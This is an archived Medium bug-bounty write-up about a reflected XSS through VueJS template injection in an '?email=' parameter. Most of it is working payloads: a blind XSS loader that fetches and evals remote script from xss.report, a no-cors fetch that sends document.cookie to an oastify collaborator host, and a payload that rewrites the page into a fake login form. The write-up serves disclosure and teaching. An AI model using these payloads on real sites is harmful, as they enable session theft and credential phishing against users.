# Vue JS Reflected XSS

- **Source URL:** https://medium.com/@sid0krypt/vue-js-reflected-xss-fae04c9872d2?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250405185756/https://medium.com/@sid0krypt/vue-js-reflected-xss-fae04c9872d2
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1264 (id 1264)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hi guys, in this writeup I will be showing you how I was able to get a reflected XSS on a VueJS application.

I found a vulnerable param named ‘**?email=**’ which was filtering all the tags. So I referred portswigger’s XSS cheatsheet to get hints for the payloads.

The first thing you should do is check the technologies used in that application. So in my case it was an application which was based on **VueJS.**

These two payloads were found to be working :

```
{{_Vue.h.constructor`alert(1)`()}}
{{$emit.constructor`alert(1)`()}}
```
Template Injection payloads:

```
{{_Vue.h.constructor('x','console.log("HI this is sid0krypt")')(this)}}
{{_Vue.h.constructor('x','console.log(x)')(this)}}
```
I don’t have any knowledge with VueJS so after some research I got to know that the constructor function works similar to \<script>\</script>.

So to create a BLIND XSS payload you could simply just use this :

``{{$emit.constructor`function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/s/sid0krypt");a.send()`()}}``
As the target was using a WAF I couldn't create a Cross Origin Request:

So in this scenario you can use the fetch request with **no-cors** *mode* which will bypass the restriction of Cross origin Resource Sharing.

```
  fetch('https://{collaborator link}', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
```
The Final Payload with the fetch request would be :

``{{$emit.constructor`fetch(%27https://8v4y3qmogobk2g6bewqtqa83quwkk9.oastify.com%27,%20{%20method:%20%27POST%27,%20mode:%20%27no-cors%27,%20body:%20document.cookie%20});`()}}``
So to escalate further more , I was able to perform **UI redressing** which was lead to completely modifying the HTML content to login page which I created and it would point to [www.target.com/login](http://www.target.com/login) so it looks like a legitimate login page.

```
{{$emit.constructor`history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue and this is a POC by sid0krypt😌💕</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"`()}}
```
Thank you for reading my writeup ! Please do ping me if you have queries regarding anything.

**Here are my socials :**

LinkedIn : [https://www.linkedin.com/in/siddharth-pasalapudi-365344196/](https://www.linkedin.com/in/siddharth-pasalapudi-365344196/)

Twitter: [https://twitter.com/Siddhar07949650](https://twitter.com/Siddhar07949650)

**References :**

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
